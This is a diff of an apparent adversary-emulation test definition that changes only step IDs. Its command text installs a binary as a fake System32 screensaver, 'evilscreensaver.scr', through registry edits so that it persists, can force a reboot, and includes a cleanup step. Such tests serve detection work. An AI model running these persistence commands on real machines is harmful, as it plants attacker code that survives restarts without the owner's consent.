@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "c0d26cb7-4d8c-48dd-a777-2e4d3236b6fb",
+      "id": "53697a29-5824-426d-8140-f67c4951027c",
       "type": "execute-command",
       "data": {
         "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "336693dd-2f13-4f35-bd2d-603d212d673d",
+      "id": "8b7dbb99-4a98-4c21-951e-74c6ffdbac77",
       "type": "execute-command",
       "data": {
         "command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "c0d26cb7-4d8c-48dd-a777-2e4d3236b6fb",
+      "s": "53697a29-5824-426d-8140-f67c4951027c",
       "p": "on-success",
-      "o": "336693dd-2f13-4f35-bd2d-603d212d673d"
+      "o": "8b7dbb99-4a98-4c21-951e-74c6ffdbac77"
     },
     {
-      "s": "c0d26cb7-4d8c-48dd-a777-2e4d3236b6fb",
+      "s": "53697a29-5824-426d-8140-f67c4951027c",
       "p": "on-failure",
-      "o": "336693dd-2f13-4f35-bd2d-603d212d673d"
+      "o": "8b7dbb99-4a98-4c21-951e-74c6ffdbac77"
     }
   ],
   "tags": [
